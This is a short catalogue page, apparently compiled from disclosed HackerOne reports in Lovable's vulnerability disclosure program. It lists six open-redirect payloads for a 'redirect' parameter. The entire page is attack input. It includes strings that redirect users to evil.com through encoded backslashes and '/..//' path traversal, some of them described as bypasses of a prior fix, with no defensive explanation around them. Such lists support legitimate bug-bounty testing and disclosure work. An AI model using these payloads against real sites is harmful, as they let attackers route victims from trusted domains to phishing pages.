# Lovable VDP

6 payloads.

### `2b8d97c5`

```
https://target.com/auth/post-login?redirect=%2F%3Fshould-refresh-credentials%3D1&_rsc=1b5jt
```

**Parameter:** `redirect`
— [Open Redirect on lovable.dev via redirect parameter leads to phishing attacks](https://hackerone.com/reports/3581815) · Lovable VDP · [jdc94](https://hackerone.com/jdc94)

### `14afb948`

```
https://target.com/auth/post-login?redirect=/\evil.com
```

**Parameter:** `redirect`
— [Open Redirect on lovable.dev via redirect parameter leads to phishing attacks](https://hackerone.com/reports/3581815) · Lovable VDP · [jdc94](https://hackerone.com/jdc94)

### `170cb6a1`

```
https://target.com/purchase-success?redirect=/%5Cevil.com.
```

**Parameter:** `redirect`
— [Open Redirect on lovable.dev via redirect parameter leads to phishing attacks](https://hackerone.com/reports/3581815) · Lovable VDP · [jdc94](https://hackerone.com/jdc94)

### `6a50ab6f`

```
/..//target.com
```

**Parameter:** `redirect`
— [Bypass of Open Redirect Fix on lovable.dev via /..// Path Traversal in redirect parameter](https://hackerone.com/reports/3599248) · Lovable VDP · [marioniangi](https://hackerone.com/marioniangi)

### `f4bc9765`

```
//target.com
```

**Parameter:** `redirect`
— [Bypass of Open Redirect Fix on lovable.dev via /..// Path Traversal in redirect parameter](https://hackerone.com/reports/3599248) · Lovable VDP · [marioniangi](https://hackerone.com/marioniangi)

### `f1e24823`

```
https://target.com/auth/post-login?redirect=/..//evil.com
```

**Parameter:** `redirect`
— [Bypass of Open Redirect Fix on lovable.dev via /..// Path Traversal in redirect parameter](https://hackerone.com/reports/3599248) · Lovable VDP · [marioniangi](https://hackerone.com/marioniangi)
